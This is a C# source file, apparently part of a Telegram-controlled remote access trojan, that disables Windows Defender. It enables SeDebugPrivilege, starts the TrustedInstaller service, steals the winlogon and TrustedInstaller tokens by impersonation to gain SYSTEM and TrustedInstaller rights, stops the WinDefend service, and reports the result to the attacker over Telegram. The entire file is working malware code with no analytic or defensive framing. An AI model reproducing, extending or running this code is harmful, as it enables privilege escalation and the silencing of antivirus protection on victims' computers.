using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using TelegramRAT;

namespace DefenderStop;

internal sealed class defenderKillClass
{
	[Flags]
	public enum SERVICE_ACCESS : uint
	{
		STANDARD_RIGHTS_REQUIRED = 0xF0000u,
		SERVICE_QUERY_CONFIG = 1u,
		SERVICE_CHANGE_CONFIG = 2u,
		SERVICE_QUERY_STATUS = 4u,
		SERVICE_ENUMERATE_DEPENDENTS = 8u,
		SERVICE_START = 0x10u,
		SERVICE_STOP = 0x20u,
		SERVICE_PAUSE_CONTINUE = 0x40u,
		SERVICE_INTERROGATE = 0x80u,
		SERVICE_USER_DEFINED_CONTROL = 0x100u,
		SERVICE_ALL_ACCESS = 0xF01FFu
	}

	[Flags]
	public enum SERVICE_CONTROL : uint
	{
		STOP = 1u,
		PAUSE = 2u,
		CONTINUE = 3u,
		INTERROGATE = 4u,
		SHUTDOWN = 5u,
		PARAMCHANGE = 6u,
		NETBINDADD = 7u,
		NETBINDREMOVE = 8u,
		NETBINDENABLE = 9u,
		NETBINDDISABLE = 0xAu,
		DEVICEEVENT = 0xBu,
		HARDWAREPROFILECHANGE = 0xCu,
		POWEREVENT = 0xDu,
		SESSIONCHANGE = 0xEu
	}

	public enum SERVICE_STATE : uint
	{
		SERVICE_STOPPED = 1u,
		SERVICE_START_PENDING,
		SERVICE_STOP_PENDING,
		SERVICE_RUNNING,
		SERVICE_CONTINUE_PENDING,
		SERVICE_PAUSE_PENDING,
		SERVICE_PAUSED
	}

	[Flags]
	public enum SERVICE_ACCEPT : uint
	{
		STOP = 1u,
		PAUSE_CONTINUE = 2u,
		SHUTDOWN = 4u,
		PARAMCHANGE = 8u,
		NETBINDCHANGE = 0x10u,
		HARDWAREPROFILECHANGE = 0x20u,
		POWEREVENT = 0x40u,
		SESSIONCHANGE = 0x80u
	}

	public struct SERVICE_STATUS
	{
		public int serviceType;

		public int currentState;

		public int controlsAccepted;

		public int win32ExitCode;

		public int serviceSpecificExitCode;

		public int checkPoint;

		public int waitHint;
	}

	public enum PrivilegeNames
	{
		SeCreateTokenPrivilege,
		SeAssignPrimaryTokenPrivilege,
		SeLockMemoryPrivilege,
		SeIncreaseQuotaPrivilege,
		SeUnsolicitedInputPrivilege,
		SeMachineAccountPrivilege,
		SeTcbPrivilege,
		SeSecurityPrivilege,
		SeTakeOwnershipPrivilege,
		SeLoadDriverPrivilege,
		SeSystemProfilePrivilege,
		SeSystemtimePrivilege,
		SeProfileSingleProcessPrivilege,
		SeIncreaseBasePriorityPrivilege,
		SeCreatePagefilePrivilege,
		SeCreatePermanentPrivilege,
		SeBackupPrivilege,
		SeRestorePrivilege,
		SeShutdownPrivilege,
		SeDebugPrivilege,
		SeAuditPrivilege,
		SeSystemEnvironmentPrivilege,
		SeChangeNotifyPrivilege,
		SeRemoteShutdownPrivilege,
		SeUndockPrivilege,
		SeSyncAgentPrivilege,
		SeEnableDelegationPrivilege,
		SeManageVolumePrivilege,
		SeImpersonatePrivilege,
		SeCreateGlobalPrivilege,
		SeTrustedCredManAccessPrivilege,
		SeRelabelPrivilege,
		SeIncreaseWorkingSetPrivilege,
		SeTimeZonePrivilege,
		SeCreateSymbolicLinkPrivilege
	}

	internal struct TokPriv1Luid
	{
		public int Count;

		public long Luid;

		public int Attr;
	}

	public struct LUID
	{
		public uint LowPart;

		public uint HighPart;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	public struct LUID_AND_ATTRIBUTES
	{
		public LUID Luid;

		public uint Attributes;
	}

	public const uint STANDARD_RIGHTS_REQUIRED = 983040u;

	public const uint STANDARD_RIGHTS_READ = 131072u;

	public const uint TOKEN_ASSIGN_PRIMARY = 1u;

	public const uint TOKEN_DUPLICATE = 2u;

	public const uint TOKEN_IMPERSONATE = 4u;

	public const uint TOKEN_QUERY = 8u;

	public const uint TOKEN_QUERY_SOURCE = 16u;

	public const uint TOKEN_ADJUST_PRIVILEGES = 32u;

	public const uint TOKEN_ADJUST_GROUPS = 64u;

	public const uint TOKEN_ADJUST_DEFAULT = 128u;

	public const uint TOKEN_ADJUST_SESSIONID = 256u;

	public const uint TOKEN_READ = 131080u;

	public const uint TOKEN_ALL_ACCESS = 983551u;

	private const int ANYSIZE_ARRAY = 1;

	internal const int SE_PRIVILEGE_DISABLED = 0;

	internal const int SE_PRIVILEGE_ENABLED = 2;

	[DllImport("advapi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool RevertToSelf();

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern bool CloseHandle(IntPtr handle);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetUserName(StringBuilder sb, ref int length);

	[DllImport("advapi32.dll", SetLastError = true)]
	internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

	[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

	public static void get_username()
	{
		StringBuilder stringBuilder = new StringBuilder(64);
		int length = 64;
		GetUserName(stringBuilder, ref length);
		Console.WriteLine(stringBuilder.ToString());
	}

	[DllImport("advapi32.dll", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr OpenSCManagerW(string machineName, string databaseName, uint dwAccess);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	private static extern IntPtr OpenServiceA(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

	[DllImport("advapi32", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

	[DllImport("advapi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ControlService(IntPtr hService, SERVICE_CONTROL dwControl, ref SERVICE_STATUS lpServiceStatus);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr GetCurrentProcess();

	public static void start_trustedinstaller_service()
	{
		IntPtr intPtr = OpenSCManagerW(null, null, 983103u);
		if (intPtr == IntPtr.Zero)
		{
			Console.WriteLine("OpenSCManager failed!");
			return;
		}
		Console.WriteLine("OpenSCManager success!");
		string lpServiceName = "TrustedInstaller";
		IntPtr intPtr2 = OpenServiceA(intPtr, lpServiceName, 16u);
		if (StartService(intPtr2, 0, null))
		{
			Console.WriteLine("TrustedInstaller service started!");
		}
		else
		{
			Console.WriteLine("TrustedInstaller service cannot be started!");
		}
		Thread.Sleep(2000);
		CloseHandle(intPtr2);
		CloseHandle(intPtr);
	}

	public static bool EnableDebugPrivilege()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			IntPtr TokenHandle = IntPtr.Zero;
			bool flag = OpenProcessToken(currentProcess, 40u, out TokenHandle);
			TokPriv1Luid newst = default(TokPriv1Luid);
			newst.Count = 1;
			newst.Luid = 0L;
			newst.Attr = 2;
			flag = LookupPrivilegeValue(null, "SeDebugPrivilege", ref newst.Luid);
			Console.WriteLine("SeDebugPrivilege enabled: " + AdjustTokenPrivileges(TokenHandle, disall: false, ref newst, 0, IntPtr.Zero, IntPtr.Zero));
			return true;
		}
		catch (Exception ex)
		{
			throw ex;
		}
	}

	public static void escalate_to_system()
	{
		Process[] processes = Process.GetProcesses();
		IntPtr TokenHandle = IntPtr.Zero;
		Process[] array = processes;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				Process process = array[num];
				if (process.ProcessName == "winlogon")
				{
					if (!OpenProcessToken(process.Handle, 131086u, out TokenHandle))
					{
						break;
					}
					ImpersonateLoggedOnUser(TokenHandle);
					Console.Write("User after impersonation: ");
					get_username();
					CloseHandle(process.Handle);
				}
				num++;
				continue;
			}
			CloseHandle(TokenHandle);
			return;
		}
		Console.WriteLine("OpenProcessToken Failed!");
	}

	public static void escalate_to_trustedinstaller()
	{
		Process[] processes = Process.GetProcesses();
		IntPtr TokenHandle = IntPtr.Zero;
		Process[] array = processes;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				Process process = array[num];
				if (process.ProcessName == "TrustedInstaller")
				{
					if (!OpenProcessToken(process.Handle, 131086u, out TokenHandle))
					{
						break;
					}
					ImpersonateLoggedOnUser(TokenHandle);
					Console.Write("Trusted Installer impersonated!");
					CloseHandle(process.Handle);
				}
				num++;
				continue;
			}
			CloseHandle(TokenHandle);
			return;
		}
		Console.WriteLine("OpenProcessToken Failed!");
	}

	public static void stop_defender_service()
	{
		IntPtr intPtr = OpenSCManagerW(null, null, 983103u);
		if (intPtr == IntPtr.Zero)
		{
			Console.WriteLine("OpenSCManager failed!");
			return;
		}
		Console.WriteLine("OpenSCManager success!");
		string lpServiceName = "WinDefend";
		IntPtr intPtr2 = OpenServiceA(intPtr, lpServiceName, 44u);
		SERVICE_STATUS lpServiceStatus = default(SERVICE_STATUS);
		if (ControlService(intPtr2, SERVICE_CONTROL.STOP, ref lpServiceStatus))
		{
			telegram.sendText("Windefender service stopped!");
		}
		else
		{
			telegram.sendText("Windefender service cannot be stopped!");
		}
		Thread.Sleep(2000);
		CloseHandle(intPtr2);
		CloseHandle(intPtr);
	}

	public static void KillDef()
	{
		Console.Write("Original user:");
		get_username();
		start_trustedinstaller_service();
		escalate_to_system();
		escalate_to_trustedinstaller();
		stop_defender_service();
	}
}
